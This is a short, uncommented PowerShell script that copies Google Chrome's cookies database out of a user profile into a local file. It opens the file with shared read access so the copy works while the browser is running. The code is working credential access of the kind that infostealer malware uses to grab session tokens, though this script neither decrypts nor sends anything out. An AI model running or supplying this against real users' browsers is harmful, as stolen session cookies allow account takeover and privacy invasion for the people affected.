$src = 'C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies'
$dest = 'temp_cookies.sqlite'
$file = [System.IO.File]::Open($src, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
$bytes = New-Object byte[] $file.Length
$file.Read($bytes, 0, $file.Length) | Out-Null
$file.Close()
[System.IO.File]::WriteAllBytes($dest, $bytes)
